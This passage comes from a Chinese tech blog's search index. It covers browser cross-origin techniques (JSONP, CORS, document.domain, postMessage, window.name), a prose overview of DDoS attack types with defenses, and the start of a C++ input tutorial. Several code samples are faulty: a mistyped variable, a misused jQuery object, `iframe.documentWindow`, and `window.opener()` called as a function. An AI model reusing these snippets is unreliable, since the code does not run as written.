class=\"string\">\"tickets\"</span>: <span class=\"number\">5</span></span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p>jsonp的全称为json with padding，上面的数据中，flightHandler就是那个padding.</p>\n<h3 id=\"特性\"><a href=\"#特性\" class=\"headerlink\" title=\"特性\"></a>特性</h3><ul>\n<li>只能使用get方法，不能使用post方法：</li>\n</ul>\n<p>script，link, img, iframe等具有<code>src</code>属性的标引入外部资源，都是 get 请求的，那么就决定了 jsonp 一定是 get 的。</p>\n<h2 id=\"CORS策略\"><a href=\"#CORS策略\" class=\"headerlink\" title=\"CORS策略\"></a>CORS策略</h2><p>CORS策略</p>\n<p>CORS是一个W3C标准，全称是”跨域资源共享”（Cross-origin resource sharing）。它允许浏览器向跨源服务器，发出XMLHttpRequest请求，从而克服了AJAX只能同源使用的限制。它为Web服务器定义了一种方式，允许网页从不同的域访问其资源.</p>\n<h3 id=\"实现方法：\"><a href=\"#实现方法：\" class=\"headerlink\" title=\"实现方法：\"></a>实现方法：</h3><p>CORS需要浏览器和服务器同时支持</p>\n<ul>\n<li>前端方面</li>\n</ul>\n<p>以前我们使用Ajax，代码类似于如下的方式：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> xhr = <span class=\"keyword\">new</span> XMLHttpRequest();</span><br><span class=\"line\"><span class=\"comment\">// 这里的“/hfahe”是本域的相对路径。</span></span><br><span class=\"line\">xhr.open(<span class=\"string\">\"GET\"</span>, <span class=\"string\">\"/hfahe\"</span>, <span class=\"literal\">true</span>);</span><br><span class=\"line\">xhr.send();</span><br></pre></td></tr></table></figure>\n<p>如果我们要使用CORS，相关Ajax代码可能如下所示：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> xhr = <span class=\"keyword\">new</span> XMLHttpRequest();</span><br><span class=\"line\"><span class=\"comment\">// 请注意，代码与之前的区别就在于相对路径换成了其他域的绝对路径，也就是要跨域访问的接口地址。</span></span><br><span class=\"line\">xhr.open(<span class=\"string\">\"GET\"</span>, <span class=\"string\">\"http://blog.csdn.net/hfahe\"</span>, <span class=\"literal\">true</span>);</span><br><span class=\"line\">xhr.send();</span><br></pre></td></tr></table></figure>\n<ul>\n<li>服务器方面</li>\n</ul>\n<p>服务器端对于CORS的支持，主要就是通过设置<code>Access-Control-Allow-Origin</code>来进行的。如果浏览器检测到相应的设置，就可以允许Ajax进行跨域的访问。</p>\n<h3 id=\"特点\"><a href=\"#特点\" class=\"headerlink\" title=\"特点\"></a>特点</h3><ul>\n<li>CORS支持所有类型的HTTP请求。</li>\n</ul>\n<h2 id=\"document-domain-iframe\"><a href=\"#document-domain-iframe\" class=\"headerlink\" title=\"document.domain+iframe\"></a>document.domain+iframe</h2><blockquote>\n<p>使用条件：主域相同</p>\n</blockquote>\n<p>浏览器中不同域的框架之间是不能进行js的交互操作的。但是不同的框架之间（父子或同辈），是能够获取到彼此的window对象的。</p>\n<p>比如，有一个页面的地址是 <code>http://www.example.com/a.html</code> ， 在这个页面里面有一个iframe，它的src是 <code>http://example.com/b.html</code>, 很显然，这个页面与它里面的iframe框架是不同域的，所以无法通过在页面中书写js代码来获取iframe中的东西的。这个时候，document.domain就可以派上用场了，只要把 <code>http://www.example.com/a.html</code> 和 <code>http://example.com/b.html</code> 这两个页面的document.domain都设成相同的域名就可以了。</p>\n<p>但要注意的是，document.domain的设置是有限制的，我们只能把document.domain设置成自身或更高一级的父域，且主域必须相同。例如：<code>a.b.example.com</code> 中某个文档的document.domain 可以设成<code>a.b.example.com</code>、<code>b.example.com</code> 、<code>example.com</code>中的任意一个，但是不可以设成 <code>c.a.b.example.com</code>,因为这是<br>当前域的子域，也不可以设成<code>baidu.com</code>,因为主域已经不相同了.</p>\n<h3 id=\"实现-1\"><a href=\"#实现-1\" class=\"headerlink\" title=\"实现\"></a>实现</h3><p>比如在<code>http://www.example.com/a.html</code> 的页面里要访问 <code>http://example.com/b.html</code>里面的东西。在页面 <code>http://www.example.com/a.html</code> 中设置document.domain:</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//http://www.example.com/a.html</span></span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;title&gt;A页面&lt;<span class=\"regexp\">/title&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    &lt;script type=\"text/</span>javascript<span class=\"string\">\" src=\"</span>jquery.js<span class=\"string\">\"&gt;&lt;/script&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/head&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;body&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;div&gt;A页面&lt;/div&gt;</span></span><br><span class=\"line\"><span class=\"string\">    // 相当于用一个隐藏的iframe来做代理</span></span><br><span class=\"line\"><span class=\"string\">    &lt;iframe id=\"</span>iframe<span class=\"string\">\" src=\"</span>http:<span class=\"comment\">//example.com/b.html\" style=\"display:none;\"&gt;&lt;/iframe&gt;</span></span><br><span class=\"line\">    &lt;script&gt;</span><br><span class=\"line\">        $(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">                <span class=\"built_in\">document</span>.domain = <span class=\"string\">\"example.com\"</span>; <span class=\"comment\">//这里将document.domain设置成一样</span></span><br><span class=\"line\">            &#125;<span class=\"keyword\">catch</span>(e)&#123;&#125;</span><br><span class=\"line\">            $(<span class=\"string\">\"#iframe\"</span>).load(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">var</span> iframe = $(<span class=\"string\">\"#iframe\"</span>).contentDocument.$;</span><br><span class=\"line\">                ifram.get(<span class=\"string\">\"http://example.com/接口\"</span>,<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">data</span>)</span>&#123;&#125;);</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &lt;<span class=\"regexp\">/script&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">&lt;body&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">&lt;/</span>html&gt;</span><br></pre></td></tr></table></figure>\n<p>在页面 <code>http://example.com/b.html</code> 中也设置document.domain，而且这也是必须的，虽然这个文档的domain就是example.com,但是还是必须显示的设置document.domain的值：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//http://example.com/b.html</span></span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;title&gt;B页面&lt;<span class=\"regexp\">/title&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    &lt;script type=\"text/</span>javascript<span class=\"string\">\" src=\"</span>jquery.js<span class=\"string\">\"&gt;&lt;/script&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/head&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;body&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;div&gt;B页面&lt;/div&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;script&gt;        </span></span><br><span class=\"line\"><span class=\"string\">        $(function()&#123;</span></span><br><span class=\"line\"><span class=\"string\">            try&#123;</span></span><br><span class=\"line\"><span class=\"string\">            document.domain = \"</span>example.com<span class=\"string\">\"; //这里将document.domain设置成一样</span></span><br><span class=\"line\"><span class=\"string\">            &#125;catch(e)&#123;&#125;</span></span><br><span class=\"line\"><span class=\"string\">        &#125;);</span></span><br><span class=\"line\"><span class=\"string\">    &lt;/script&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/body&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>\n<p>这里有个注意点，就是在A页面中，要等iframe标签完成加载B页面之后，再取iframe对象的contentDocument,否则如果B页面没有被iframe完全加载，在A页面中通过contentDocument属性就取不到B页面中的jQuery对象。一旦取到B页面中的jQuery对象，就可以直接发ajax请求了，这种类似“代理”方式可以解决主子域的跨域问题</p>\n<h2 id=\"HTML5-postMessage\"><a href=\"#HTML5-postMessage\" class=\"headerlink\" title=\"HTML5 postMessage\"></a>HTML5 postMessage</h2><p>HTML5 window.postMessage是一个安全的、基于事件的消息API</p>\n<p>在需要发送消息的源窗口调用postMessage方法即可发送消息。其中, 源窗口可以是全局的window对象，也可以是以下类型的窗口：</p>\n<ul>\n<li>文档窗口中的iframe:</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'my-iframe'</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> win = iframe.documentWindow;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>JavaScript打开的弹窗：</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var win = window.open();</span><br></pre></td></tr></table></figure>\n<ul>\n<li>当前文档窗口的父窗口：</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var win = window.parent;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>window.opener</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var win = window.opener();</span><br></pre></td></tr></table></figure>\n<p>发送消息：找到源window对象后，即可调用postMessage API向目标窗口发送消息：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">win.postMessage(msg, targetOrigin);</span><br></pre></td></tr></table></figure>\n<p>接收消息：那目标窗口要怎么接收传过来的数据呢，只要监听window的message事件就可以接收了。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var onmessage = function (event) &#123;</span><br><span class=\"line\">    var data = event.data;</span><br><span class=\"line\">    var origin = event.origin;</span><br><span class=\"line\">    //do someing</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">if (typeof window.addEventListener != &apos;undefined&apos;) &#123;</span><br><span class=\"line\">    window.addEventListener(&apos;message&apos;, onmessage, false);</span><br><span class=\"line\">&#125; else if (typeof window.attachEvent != &apos;undefined&apos;) &#123;</span><br><span class=\"line\">    //for ie</span><br><span class=\"line\">    window.attachEvent(&apos;onmessage&apos;, onmessage);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"实现-2\"><a href=\"#实现-2\" class=\"headerlink\" title=\"实现\"></a>实现</h2><ul>\n<li><code>http://test.com/index.html</code> —&gt; 发送消息的页面</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- 这个是 http:<span class=\"comment\">//test.com/index.html 页面 --&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"> &lt;div&gt;</span><br><span class=\"line\">    &lt;!-- 要给下面的页面传一个妹子过去 --&gt;</span><br><span class=\"line\">    &lt;iframe id=<span class=\"string\">\"child\"</span> src=<span class=\"string\">\"http://lsLib.com/lsLib.html\"</span>&gt;<span class=\"xml\"><span class=\"tag\">&lt;/<span class=\"name\">iframe</span>&gt;</span></span>  </span><br><span class=\"line\">&lt;<span class=\"regexp\">/div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">&lt;script type=\"text/</span>javascript<span class=\"string\">\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">    window.onload=function()&#123;</span></span><br><span class=\"line\"><span class=\"string\">        window.frames[0].postMessage('xxx','http://lslib.com');</span></span><br><span class=\"line\"><span class=\"string\">    &#125;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li><code>http://lslib.com/lslib.html</code> —&gt; 接收消息的页面</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- 这个是 http://lslib.com/lslib.html 页面 --&gt;</span><br><span class=\"line\">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class=\"line\">    window.addEventListener(&apos;message&apos;,function(e) &#123;</span><br><span class=\"line\">        console.log(e.origin,e.data);</span><br><span class=\"line\">        alert(&apos;收到妹子一枚：&apos;+e.data);</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"window-name\"><a href=\"#window-name\" class=\"headerlink\" title=\"window.name\"></a>window.name</h2><p>原理：当iframe的页面跳到其他地址时，其<code>window.name值保持不变</code>，并且可以支持非常长的 name 值（2MB）。</p>\n<p>浏览器跨域iframe禁止互相调用/传值.但是调用iframe时 window.name 却不变,正是利用这个特性来互相传值,当然跨域下是不容许读取ifram的window.name值.所以这里我们还要准备一个和主页面<code>http://www.a.com/main.html</code> 相同域下的代理页面<code>http://www.a.com/other.html</code> ,iframe调用子页面<code>http://www.b.com/data.html</code></p>\n<h2 id=\"实现-3\"><a href=\"#实现-3\" class=\"headerlink\" title=\"实现\"></a>实现</h2><ul>\n<li><p>准备三个页面：</p>\n<ul>\n<li><code>http://www.a.com/main.html</code>   //应用页面</li>\n<li><code>http://www.a.com/other.html</code>  // 代理页面，要求和应用页面在同一个域。一般是一个空的html</li>\n<li><code>http://www.b.com/data.html</code>   //应用页面获取数据的页面，简称：数据页面</li>\n</ul>\n</li>\n<li><p>数据页面将数据传到window.name中去。</p>\n</li>\n</ul>\n<p><code>http://www.b.com/data.html</code>中的 data.html</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// data.html</span><br><span class=\"line\">window.name=&quot;xxx&quot;;       //可以是其他类型的数据，比如数组，对象等等</span><br></pre></td></tr></table></figure>\n<p>应用页面 <code>http://www.a.com/main.html</code> 的代码如下：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- main.html --&gt;</span><br><span class=\"line\"><span class=\"keyword\">var</span> iframeData;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> state = <span class=\"number\">0</span>;<span class=\"comment\">//开关变量</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">'iframe'</span>); <span class=\"comment\">//创建iframe</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> loadfn = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (state === <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        iframeData = iframe.contentWindow.name;  <span class=\"comment\">// 读取数据</span></span><br><span class=\"line\"></span><br><span class=\"line\">        alert(<span class=\"string\">'获取到了iframe传过来的妹子'</span>+iframeData);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (state === <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">         state = <span class=\"number\">1</span>;</span><br><span class=\"line\">         iframe.contentWindow.location = <span class=\"string\">'http://www.a.com/other.html'</span>;  <span class=\"comment\">//这里是代理页面 other.html</span></span><br><span class=\"line\"></span><br><span class=\"line\">         <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">             这里说明一下:</span></span><br><span class=\"line\"><span class=\"comment\">             由于iframe的location改变了，相当于重新载入页面（这是iframe的性质决定的），于是重新执行loadfn方法。</span></span><br><span class=\"line\"><span class=\"comment\">　　　　　　　 由于当iframe的页面跳到其他地址时，其window.name值保持不变，并且此时开关变量 state已经变为1，</span></span><br><span class=\"line\"><span class=\"comment\">             于是就可以获取到window.name值，也就达到了跨域访问的目的了。</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">        **/</span></span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">iframe.src = <span class=\"string\">'http://www.b.com/data.html'</span>; <span class=\"comment\">//这是是数据页面，data.html</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (iframe.attachEvent) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    iframe.attachEvent(<span class=\"string\">'onload'</span>, loadfn);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    iframe.onload  = loadfn;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure>\n<ul>\n<li>获取数据以后销毁这个iframe，释放内存；这也保证了安全（不被其他域frame js访问）。</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">iframe.contentWindow.document.write(<span class=\"string\">''</span>);</span><br><span class=\"line\">iframe.contentWindow.close();</span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.removeChild(iframe);</span><br></pre></td></tr></table></figure>\n<h2 id=\"WebSocket\"><a href=\"#WebSocket\" class=\"headerlink\" title=\"WebSocket\"></a>WebSocket</h2><p>WebSocket是一种通信协议，使用<code>ws://</code>（非加密）和<code>wss://</code>（加密）作为协议前缀。该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信</p>\n","categories":["Web安全"],"tags":["同源策略"]},{"title":"DDoS","url":"http://www.beesfun.com/2017/03/25/DDos/","content":"<img src=\"/2017/03/25/DDos/DDoS.png\">\n<a id=\"more\"></a>\n<h2 id=\"攻击带宽\"><a href=\"#攻击带宽\" class=\"headerlink\" title=\"攻击带宽\"></a>攻击带宽</h2><h2 id=\"攻击系统资源\"><a href=\"#攻击系统资源\" class=\"headerlink\" title=\"攻击系统资源\"></a>攻击系统资源</h2><h3 id=\"SYN-Flood攻击\"><a href=\"#SYN-Flood攻击\" class=\"headerlink\" title=\"SYN Flood攻击\"></a>SYN Flood攻击</h3><p>SYN Flood攻击是当前网络上最为常见的DDos攻击，也是最为经典的拒绝服务攻击，它利用了TCP协议实现上的一个缺陷，通过向网络服务所在端口发送大量的伪造源地址的半连接请求，造成目标服务器中的半连接队列被占满，耗费CPU和内存资源，使服务器超负荷，从而阻止其他合法用户进行访问</p>\n<h3 id=\"TCP混乱数据包攻击\"><a href=\"#TCP混乱数据包攻击\" class=\"headerlink\" title=\"TCP混乱数据包攻击\"></a>TCP混乱数据包攻击</h3><p>TCP混乱数据包攻击与Syn Flood攻击类似，发送伪造源IP的TCP数据包，只不过TCP头的TCP Flags 部分是混乱的，可能是syn,ack,syn+ack,syn+rst等等，会造成一些防护设备处理错误锁死，消耗服务器CPU内存的同时还会堵塞带宽</p>\n<h4 id=\"防范措施\"><a href=\"#防范措施\" class=\"headerlink\" title=\"防范措施\"></a>防范措施</h4><ul>\n<li>缩短SYN Timeout时间，及时将超时请求丢弃，释放被占用CPU和内存资源。</li>\n<li>限制同时打开的SYN半连接数目，关闭不必要的服务。</li>\n<li>设置SYN Cookie，给每一个请求连接的IP地址分配一个Cookie。如果短时间内连续受到某个IP的重复SYN报文，就认定是受到了攻击，以后从这个IP地址来的包会被一概丢弃。</li>\n<li>syn proxy, 这种技术对所有的syn包均主动回应，探测发起syn包的源IP地址是否真实存在，如果该IP地址真实存在，则该IP会回应防护设备的探测包，从而建立TCP连接。大多数的国内外抗DDOS产品均采用此类技术</li>\n<li>Safereset技术：此技术对所有的syn包均主动回应，探测包特意构造错误的字段，真实存在的IP地址会发送rst包给防护设备，然后发起第2次连接，从而建立TCP连接</li>\n<li>syn重传技术：该技术利用了TCP/IP协议的重传特性，来自某个源IP的第一个syn包到达时被直接丢弃并记录状态，在该源IP的第2个syn包到达时进行验证，然后放行</li>\n</ul>\n<h2 id=\"攻击应用资源\"><a href=\"#攻击应用资源\" class=\"headerlink\" title=\"攻击应用资源\"></a>攻击应用资源</h2><h3 id=\"TCP全连接攻击\"><a href=\"#TCP全连接攻击\" class=\"headerlink\" title=\"TCP全连接攻击\"></a>TCP全连接攻击</h3><p>这种攻击是为了绕过常规防火墙的检查而设计的，针对用户态运行的tcp服务器。一般情况下，常规防火墙大多具备syn cookies或者syn proxy能力，能够有效应对伪造的IP攻击，但对于正常的TCP连接是放过的。但殊不知很多网络服务程序能接受的TCP连接数是有限的，一旦有大量的 TCP连接，即便是正常的，也会导致网站访问非常缓慢甚至无法访问，正所谓“多情总被无情伤”。TCP全连接攻击就是通过许多僵尸主机不断地与受害服务器建立大量的TCP连接，直到服务器的内存等资源被耗尽而被拖跨，从而造成拒绝服务，这种攻击的特点是可绕过一般防火墙的防护而达到攻击目的。</p>\n<h3 id=\"UDP-Flood攻击\"><a href=\"#UDP-Flood攻击\" class=\"headerlink\" title=\"UDP Flood攻击\"></a>UDP Flood攻击</h3><p>常见的情况是利用大量UDP小包冲击DNS服务器或Radius认证服务器、流媒体视频服务器。 100k PPS的UDP Flood经常将线路上的骨干设备例如防火墙打瘫，造成整个网段的瘫痪。由于UDP协议是一种无连接的服务，在UDP FLOOD攻击中，攻击者可发送大量伪造源IP地址的小UDP包。但是，由于UDP协议是无连接性的，所以只要开了一个UDP的端口提供相关服务的话，那么就可针对相关的服务进行攻击。</p>\n<h3 id=\"DNS-Flood攻击\"><a href=\"#DNS-Flood攻击\" class=\"headerlink\" title=\"DNS Flood攻击\"></a>DNS Flood攻击</h3><p>UDP DNS Query Flood攻击实质上是UDP Flood的一种，但是由于DNS服务器的不可替代的关键作用，一旦服务器瘫痪，影响一般都很大。UDP DNS Query Flood攻击采用的方法是向被攻击的服务器发送大量的域名解析请求，通常请求解析的域名是随机生成或者是网络世界上根本不存在的域名，被攻击的DNS 服务器在接收到域名解析请求的时候首先会在服务器上查找是否有对应的缓存，如果查找不到并且该域名无法直接由服务器解析的时候，DNS 服务器会向其上层DNS服务器递归查询域名信息。</p>\n<h4 id=\"防范\"><a href=\"#防范\" class=\"headerlink\" title=\"防范\"></a>防范</h4><p>对突然发起大量频度较低的域名解析请求的源 IP 地址进行带宽限制，在攻击发生时降低很少发起域名解析请求的源IP地址的优先级，限制每个源 IP 地址每秒的域名解析请求次数</p>\n<h2 id=\"攻击web服务器\"><a href=\"#攻击web服务器\" class=\"headerlink\" title=\"攻击web服务器\"></a>攻击web服务器</h2><h3 id=\"CC攻击\"><a href=\"#CC攻击\" class=\"headerlink\" title=\"CC攻击\"></a>CC攻击</h3><p>CC攻击(Challenge Collapsar)是DDOS攻击的一种，是利用不断对网站发送连接请求致使形成拒绝服务的攻击。相比其它的DDOS攻击，CC攻击是应用层的，主要针对网站。CC主要是用来攻击页面的，CC就是模拟多个用户(少线程就是多少用户)不停地进行访问那些需要大量数据操作(就是需要大量CPU时间)的页面，造成服务器资源的浪费，CPU长时间处于100%，永远都有处理不完的连接直至就网络拥塞，正常的访问被中止。</p>\n<p>这种攻击主要是针对存在ASP、JSP、php、CGI等脚本程序，并调用mssql Server、mysqlServer、Oracle等数据库的网站系统而设计的，特征是和服务器建立正常的TCP连接，并不断的向脚本程序提交查询、列表等大量耗费数据库资源的调用，典型的以小博大的攻击方法。这种攻击的特点是可以完全绕过普通的防火墙防护，轻松找一些Proxy代理就可实施攻击，缺点是对付只有静态页面的网站效果会大打折扣。</p>\n<h3 id=\"防范-1\"><a href=\"#防范-1\" class=\"headerlink\" title=\"防范\"></a>防范</h3><p>对是否HTTP Get的判断，要统计到达每个服务器的每秒钟的GET请求数，如果远远超过正常值，就要对HTTP协议解码，找出HTTP Get及其参数(例如URL等)。然后判断某个GET 请求是来自代理服务器还是恶意请求，并回应一个带Key的响应要求，请求发起端作出相应的回馈。如果发起端不响应则说明是利用工具发起的请求，这样HTTP Get请求就无法到达服务器，达到防护的效果。</p>\n","categories":["Web安全"],"tags":["DDoS"]},{"title":"在线编程","url":"http://www.beesfun.com/2017/03/24/在线编程/","content":"<h2 id=\"C\"><a href=\"#C\" class=\"headerlink\" title=\"C++\"></a>C++</h2><h3 id=\"输入\"><a href=\"#输入\" class=\"headerlink\" title=\"输入\"></a>输入</h3><p>在线编程输入输出很关键，特别是输入，输入读数据的方式不对，连测试样例都读不进来，功能实现了，也还是通不过，这里列举一些碰到的例子，慢慢总结。</p>\n<ul>\n<li>cin</li>\n</ul>\n<p><code>cin &gt;&gt; a &gt;&gt; b;</code>, <code>&gt;&gt;</code> 是会过滤掉不可见字符（如 空格 回车，TAB 等); 不想略过空白字符，那就使用 noskipws 流控制 <code>cin&gt;&gt;noskipws&gt;&gt;input[j];</code></p>\n<a id=\"more\"></a>\n<ul>\n<li>cin.get()</li>\n</ul>\n<p>可以用来接收字符, 或字符串(可以接受空格)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">main ()</span><br><span 